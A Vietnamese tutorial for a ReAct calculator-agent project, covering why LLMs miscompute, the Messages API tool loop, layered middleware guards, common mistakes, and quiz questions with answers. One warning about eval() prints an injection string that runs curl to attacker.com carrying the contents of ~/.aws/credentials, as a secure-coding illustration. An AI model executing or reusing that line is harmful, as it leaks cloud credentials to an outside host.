# Giải thích — từ intermediate lên expert

Tài liệu học đi kèm dự án. Mục tiêu: sau khi đọc, bạn không chỉ *dùng được* framework
này mà còn **tự thiết kế lại được** một agent tương tự cho bài toán khác.

---

## Phần 1 — Vì sao LLM không tính được, dù nó "biết" toán

### 1.1 Cơ chế

Transformer sinh văn bản bằng cách, ở mỗi bước, chọn token tiếp theo có xác suất cao nhất
dựa trên các token trước đó. Không có thanh ghi, không có ALU, không có vòng lặp mang số nhớ.

Phép nhân `1234567 × 7654321` đòi hỏi 7 phép nhân từng chữ số, 7 phép dịch, rồi cộng
dồn có nhớ — một **thuật toán tuần tự nhiều bước**. Transformer phải "mô phỏng" chuỗi
bước đó trong một số lớp cố định. Khi số chữ số tăng, độ sâu tính toán cần thiết vượt
quá độ sâu mạng, và độ chính xác **sụp đổ**, chứ không giảm dần.

Dziri et al. (NeurIPS 2023) đo trực tiếp hiện tượng này: độ chính xác nhân số nguyên
giảm rất nhanh khi số chữ số tăng, kể cả với model đã được fine-tune riêng cho tác vụ
nhân — bằng chứng cho thấy model đang **so khớp mẫu (pattern matching)** chứ không
**chạy thuật toán**.[^faith]

Nogueira et al. (2021) chỉ thêm một nguyên nhân thực dụng: **cách token hoá con số**.
Tuỳ bộ tokenizer, `"1234567"` có thể bị cắt thành `"123"|"45"|"67"` — ranh giới token
không trùng ranh giới hàng đơn vị/chục/trăm. Model phải học lại vị trí hàng từ những
mảnh vỡ tuỳ tiện. Đổi cách biểu diễn số làm độ chính xác thay đổi mạnh.[^nogueira]

### 1.2 Hệ quả cho người thiết kế hệ thống

> Sai số học của LLM **không phải bug sẽ được vá ở model sau**. Nó là hệ quả của kiến
> trúc. Cách xử lý đúng là **kiến trúc**: đưa phép tính ra khỏi model.

Đây chính là luận điểm của bài báo ReAct: đan xen *suy luận* (model) với *hành động*
lên môi trường bên ngoài (công cụ), rồi đưa *quan sát* quay lại làm ngữ cảnh cho bước
suy luận kế tiếp.[^react]

### 1.3 Vùng nguy hiểm nhất

Không phải số cực lớn. Là số **vừa đủ lớn để trông hợp lý**:

```
17 × 24        -> model gần như luôn đúng (mẫu quen thuộc)
1234567 × 7654321 -> model thường sai vài chữ số Ở GIỮA
                      9,449,772,114,007   <- đúng
                      9,449,772,000,000   <- kiểu sai điển hình: đúng đầu, đúng đuôi, hỏng giữa
```

Con người rà soát sẽ nhìn 3 chữ số đầu, thấy khớp, và cho qua. Đó là lý do lớp
`NumberGroundingGuard` tồn tại: **máy phải kiểm, vì mắt người không kiểm nổi.**

---

## Phần 2 — ReAct thực sự là gì

### 2.1 Ba trường phái

```
CHAIN-OF-THOUGHT          ACT-ONLY                   ReAct
"nghĩ, rồi trả lời"       "gọi tool, rồi trả lời"    "nghĩ → gọi tool → nhìn kết quả
                                                       → nghĩ tiếp → ..."

USER                      USER                       USER
  │                         │                          │
  ▼                         ▼                          ▼
THINK think think         ACTION ─────► TOOL         THINK  "cần nhân 2 số này"
  │                         │            │             │
  ▼                         ▼◄───────────┘             ▼
ANSWER (số bịa)           ANSWER                     ACTION calculator("1234567*7654321")
                          (không tự sửa được)          │
Suy luận tốt,             Có dữ liệu thật,             ▼
tính toán sai.            nhưng không suy luận       OBSERVE "= 9449772114007"
                          nhiều bước được.             │
                                                       ▼
                                                     THINK  "đủ dữ kiện rồi"
                                                       │
                                                       ▼
                                                     ANSWER (số có cơ sở)
```

Giá trị cốt lõi của ReAct nằm ở mũi tên **OBSERVE → THINK**: model được nhìn thấy
kết quả thật của hành động trước khi quyết định bước sau. Nhờ vòng phản hồi này,
agent tự sửa được lỗi (tool báo `is_error` → đổi tham số → gọi lại) mà
chain-of-thought thuần không làm được.[^react]

### 2.2 ReAct trong Messages API là gì, cụ thể

Không có "ReAct API". ReAct chỉ là một vòng `while` quanh `messages.create`:

```python
while True:
    resp = client.messages.create(model=..., system=..., messages=messages,
                                  tools=tools, tool_choice=tool_choice)
    messages.append({"role": "assistant", "content": resp.content})

    if resp.stop_reason != "tool_use":        # model đã kết luận
        break

    results = []
    for block in resp.content:
        if block.type == "tool_use":
            out = my_functions[block.name](**block.input)     # <- Python chạy, không phải model
            results.append({"type": "tool_result",
                            "tool_use_id": block.id,          # <- PHẢI khớp id
                            "content": out})
    messages.append({"role": "user", "content": results})     # <- observation là role "user"
```

Đó là toàn bộ `agent.py`. Mọi thứ còn lại trong dự án này là **kiểm soát** quanh
vòng lặp 15 dòng đó. Ba chi tiết dễ sai nhất được ghi ở
[ARCHITECTURE.md §3](ARCHITECTURE.md#3-hợp-đồng-với-messages-api).[^toolcalls]

---

## Phần 3 — Vì sao cần đúng 5 lớp

Ánh xạ kiến trúc: mỗi lớp trả lời một câu hỏi khác nhau.

```
PROMPT      "Agent NÊN cư xử thế nào?"        ← ràng buộc mềm, model có thể vi phạm
MODEL       "Ai sinh ra quyết định?"          ← có thể thay thế (thật / giả / provider khác)
TOOL        "Điều gì có thể được THỰC THI?"   ← tất định, có thể unit test
STATE       "Đã xảy ra những gì?"             ← audit trail, bằng chứng
MIDDLEWARE  "Agent BẮT BUỘC phải làm gì?"     ← ràng buộc cứng, chính sách cắm/rút được
```

Kiểm chứng nhanh: **nếu bạn chỉ có prompt + model + tool, bạn có một demo.
Thêm state + middleware, bạn có một hệ thống.**

### 3.1 Tại sao MIDDLEWARE là lớp quan trọng nhất

Vì nó là chỗ duy nhất bạn có thể **bảo đảm** điều gì đó.

| Bạn muốn | Prompt làm được? | Middleware làm được? |
|---|---|---|
| "Luôn gọi công cụ khi có phép tính" | Khuyên được, không ép được | ✅ `tool_choice={"type":"any"}` |
| "Không được gọi quá 12 lần tool" | Không | ✅ `ToolGuard.max_calls` |
| "Số trong câu trả lời phải có cơ sở" | Không | ✅ `NumberGroundingGuard` |
| "Không bao giờ chạy shell" | Không | ✅ không đăng ký tool đó |

Mô hình onion — `before_*` chạy xuôi, `after_*` chạy ngược:

```
        ┌─ MathIntentRouter ────────────────────────────┐
        │  ┌─ ToolGuard ─────────────────────────────┐  │
        │  │  ┌─ NumberGroundingGuard ────────────┐  │  │
        │  │  │  ┌─ Tracing ───────────────────┐  │  │  │
   req ─┼──┼──┼──┼───────► [MODEL / TOOL] ─────┼──┼──┼──┼─► resp
        │  │  │  └─────────────────────────────┘  │  │  │
        │  │  └───────────────────────────────────┘  │  │
        │  └─────────────────────────────────────────┘  │
        └───────────────────────────────────────────────┘
```

Middleware khai báo **đầu tiên** là lớp **ngoài cùng**: `before_*` của nó chạy sớm nhất,
`after_*` của nó chạy muộn nhất.

Điều này dẫn tới một quy tắc phản trực giác: **`TracingMiddleware` phải đứng CUỐI.**
Nếu đặt nó đầu tiên, `before_model` của nó chạy *trước* `MathIntentRouter`, nên nó log
ra `tool_choice` **mặc định** chứ không phải giá trị thật được gửi lên API. Đây là lỗi
đã thực sự xảy ra khi viết dự án này — trace in `auto` trong khi request gửi `any`.
Test `test_tracing_sees_the_real_tool_choice` khoá hành vi đúng lại.

Nguyên tắc chung: **middleware quan sát đứng trong cùng, middleware chính sách đứng
ngoài.** Quan sát phải nhìn thấy *kết quả cuối cùng của mọi chính sách*, không phải
trạng thái nửa chừng.

### 3.2 Ví dụ: thêm một chính sách ngân hàng trong 10 dòng

Giả sử tuân thủ yêu cầu: không được tính trên khoản vay vượt 50 tỷ nếu chưa có phê duyệt.

```python
class CreditLimitGuard(Middleware):
    name = "credit_limit"
    LIMIT = 50_000_000_000

    def before_tool(self, state, call):
        if call.name == "loan_payment" and call.input.get("principal", 0) > self.LIMIT:
            call.blocked_reason = (
                f"Khoản vay vượt hạn mức tự động {self.LIMIT:,} VND. "
                "Cần phê duyệt của cấp có thẩm quyền."
            )
        return call
```

Cắm vào list middleware. Không đụng một dòng nào của `agent.py`, `tools.py`, hay prompt.
Đó là dấu hiệu ranh giới lớp được vẽ đúng.

---

## Phần 4 — Điều mà đa số agent tự viết làm sai

### Sai lầm 1 — Ép `tool_choice="any"` ở mọi bước

```python
# SAI: agent không bao giờ thoát được vòng lặp
tool_choice = {"type": "any"}   # mọi bước

# ĐÚNG: ép cho tới khi CÓ observation, rồi nhả
has_observation = any(c.executed and not c.is_error for c in state.tool_calls)
tool_choice = {"type": "any"} if (intent == "math" and not has_observation) else {"type": "auto"}
```

### Sai lầm 2 — Để tool ném exception ra ngoài

Lỗi tool là **thông tin cho model**, không phải sự cố của hệ thống. Trả về
`is_error: true` và model sẽ tự sửa tham số ở bước sau.

### Sai lầm 3 — Dùng `eval()` cho biểu thức do model sinh

```python
eval("__import__('os').system('curl attacker.com/$(cat ~/.aws/credentials)')")
```

Đây là RCE, không phải rủi ro lý thuyết: chuỗi biểu thức có thể đến từ nội dung do
người dùng cung cấp (prompt injection). Dùng AST allow-list — xem `tools.safe_eval`.

### Sai lầm 4 — Tin rằng prompt là cơ chế thực thi

Prompt là *tài liệu hướng dẫn*, không phải *hàng rào*. Mọi thứ bạn thật sự cần bảo đảm
phải được cài ở tầng code.

### Sai lầm 5 — Không có `FakeModel`

Nếu test của bạn cần gọi LLM thật thì: test flaky, chạy chậm, tốn tiền, CI cần secret,
và bạn sẽ ngừng chạy test. Dự án này: **88 test, 0.1 giây, 0 token** — vì vòng lặp
được test bằng `FakeModel`, còn `test_live_smoke.py` chỉ dùng để kiểm chứng
*giả định về API* là đúng ngoài thực tế.

### Sai lầm 6 — Guard hỏng âm thầm

Lỗi thật đã xảy ra khi viết dự án này: regex trích số nuốt luôn dấu chấm cuối câu,
làm guard **bỏ qua mọi số nằm cuối câu** — tức là bỏ qua đúng vị trí mà kết quả
thường nằm. Test vẫn xanh, agent trông vẫn chạy tốt. Bài học:
**guard phải có test chứng minh nó BẮT được lỗi, chứ không chỉ test nó không làm hỏng gì.**

### Sai lầm 7 — Đặt middleware quan sát ở ngoài cùng

Trực giác nói "log phải bọc ngoài để thấy hết". Với mô hình onion thì ngược lại:
middleware ngoài cùng chạy `before_*` **sớm nhất**, tức là *trước* khi các chính sách
bên trong kịp sửa request. Kết quả là log ghi lại trạng thái nửa chừng.
Xem §3.1 và `test_tracing_sees_the_real_tool_choice`.

---

## Phần 5 — Đọc kết quả của agent

```python
from react_calc_agent import ReActAgent
state = ReActAgent(verbose=True).run("Khách vay 1.250.000.000 VND, lãi 9,6%/năm, 240 tháng. Mỗi tháng trả bao nhiêu?")
print(state.summary())
```

Những trường cần nhìn khi vận hành:

| Trường | Ý nghĩa | Đèn đỏ khi |
|---|---|---|
| `intent` | Router phân loại thế nào | `non_math` cho câu rõ ràng là tính toán |
| `tool_calls` | Đã chạy gì, input/output ra sao | Rỗng trong khi `intent == "math"` |
| `retries_used` | Guard đã bắt bịa số mấy lần | > 0 thường xuyên → prompt hoặc model chưa ổn |
| `warnings` | Guard đã fail-open | Khác rỗng → có số không truy vết được |
| `status` | `succeeded` / `halted` / `failed` | `halted` → agent lặp không thoát |
| `usage` | Token đã tiêu | Tăng bất thường → gọi tool trùng lặp |
| `trace` | Nhật ký từng bước | Dùng khi điều tra sự cố |

---

## Ba câu hỏi kiểm tra hiểu bài

**Câu 1.** Một đồng nghiệp nói: *"Chỉ cần viết trong system prompt là 'luôn dùng
calculator cho mọi phép tính' là đủ, không cần `MathIntentRouter` hay
`NumberGroundingGuard' cho phức tạp."*
Hãy phản biện bằng **cơ chế** (không phải bằng cảm tính), và chỉ ra chính xác
**loại bảo đảm** mà mỗi lớp trong ba lớp phòng thủ đem lại. Ba lớp này có thể thay
thế cho nhau được không? Vì sao?

**Câu 2.** Bạn sửa `MathIntentRouter` thành luôn trả `tool_choice={"type":"any"}` bất
kể trạng thái nào. Hãy mô tả *chính xác* chuyện gì xảy ra khi chạy
`agent.run("Tính 17 * 24")`: `state.step` bằng bao nhiêu khi kết thúc, `state.status`
là gì, `state.final_answer` chứa gì, và bao nhiêu lần gọi API bị tiêu? Vì sao vòng lặp
không tự thoát được? Test nào trong dự án sẽ đỏ?

**Câu 3.** Ngân hàng của bạn muốn thêm công cụ `query_customer_balance(customer_id)` —
truy vấn số dư thật từ core banking. Hãy nêu: (a) công cụ này phá vỡ giả định nào của
`NumberGroundingGuard` và vì sao; (b) bạn sửa guard thế nào để số dư thật không bị coi
là "số bịa"; (c) bạn thêm middleware nào để tránh rò rỉ dữ liệu khách hàng qua
`state.trace`; (d) `ToolGuard.block_duplicates` có còn đúng với công cụ này không?

<details>
<summary>Đáp án gợi ý (chỉ mở sau khi đã tự trả lời)</summary>

**Câu 1.** Prompt là ràng buộc **mềm**: nó chỉ dịch chuyển phân phối xác suất sinh
token, không loại bỏ nhánh vi phạm — xác suất vi phạm giảm nhưng luôn khác 0, và tăng
lên khi đầu vào lạ hoặc dài. `tool_choice={"type":"any"}` là ràng buộc **cứng do phía
API bảo đảm**: response *không thể* không chứa `tool_use` block. `NumberGroundingGuard`
là **hậu kiểm**: nó không ngăn model bịa, nó *phát hiện* sau khi bịa và ép làm lại.
Ba lớp **không thay thế được nhau** vì chúng chặn ba chế độ hỏng khác nhau ở ba thời
điểm khác nhau: trước khi sinh (prompt), lúc sinh (tool_choice), sau khi sinh (guard).
Ví dụ cụ thể: `tool_choice="any"` ép gọi tool nhưng **không** ngăn model trích dẫn sai
kết quả tool ở bước kết luận — chỉ guard bắt được ca đó.

**Câu 2.** Bước 1 model gọi tool, có observation. Bước 2 `tool_choice` vẫn là `"any"`
nên API **bắt buộc** sinh `tool_use` → `stop_reason == "tool_use"` → agent coi đây là
ACT chứ không phải kết luận → lặp tiếp. Lặp cho tới khi `state.step == max_steps` (mặc
định 8). Kết thúc: `status == "halted"`, `final_answer` là `HALTED_NOTICE`
("đã đạt giới hạn 8 bước..."), tiêu 8 lần gọi API (và `ToolGuard.block_duplicates` sẽ
chặn phần lớn các lần gọi trùng, trả về `is_error`). Vòng lặp không thoát được vì
điều kiện thoát là `stop_reason != "tool_use"`, mà `tool_choice="any"` khiến điều kiện
đó **không bao giờ** đúng. Test đỏ: `test_no_infinite_force_loop`,
`test_router_forces_tool_use_then_releases`, `test_tool_choice_sequence_is_any_then_auto`.

**Câu 3.** (a) Guard giả định "số hợp lệ = số truy vết về đề bài hoặc output tool".
`query_customer_balance` **vẫn thoả** giả định đó vì số dư đi qua `after_tool` và được
nạp vào `verified_numbers` — nên thực ra guard *không* bị phá vỡ. Cái bị phá vỡ là giả
định ngầm khác: *tool là hàm thuần tuý, tất định*. Số dư thay đổi theo thời gian, nên
`block_duplicates` sai (xem d) và kết quả không tái lập được khi debug.
(b) Không cần sửa gì cho việc nhận số dư là hợp lệ; nhưng nên tách `verified_numbers`
thành hai tập (từ tính toán / từ dữ liệu ngoài) để audit phân biệt được nguồn.
(c) Thêm middleware `RedactionMiddleware` override `after_tool` để che `customer_id`
và số dư trước khi ghi vào `state.trace`/log, đồng thời giới hạn nội dung `summary()`.
(d) **Không còn đúng** — hai lần gọi cùng `customer_id` ở hai thời điểm có thể ra kết
quả khác nhau. Cần cho phép khai báo `cacheable=False` trên từng `Tool` và để
`ToolGuard` bỏ qua kiểm tra trùng với các tool đó.
</details>

---

## Nguồn

[^react]: Yao, S., Zhao, J., Yu, D., Du, N., Shafran, I., Narasimhan, K., & Cao, Y. (2023). *ReAct: Synergizing Reasoning and Acting in Language Models*. ICLR 2023. <https://arxiv.org/abs/2210.03629>

[^faith]: Dziri, N., Lu, X., Sclar, M., et al. (2023). *Faith and Fate: Limits of Transformers on Compositionality*. NeurIPS 2023. <https://arxiv.org/abs/2305.18654>

[^nogueira]: Nogueira, R., Jiang, Z., & Lin, J. (2021). *Investigating the Limitations of Transformers with Simple Arithmetic Tasks*. <https://arxiv.org/abs/2102.13019>

[^toolcalls]: Anthropic. *Tool use overview* — <https://platform.claude.com/docs/en/agents-and-tools/tool-use/overview> · *Handle tool calls* — <https://platform.claude.com/docs/en/agents-and-tools/tool-use/handle-tool-calls>
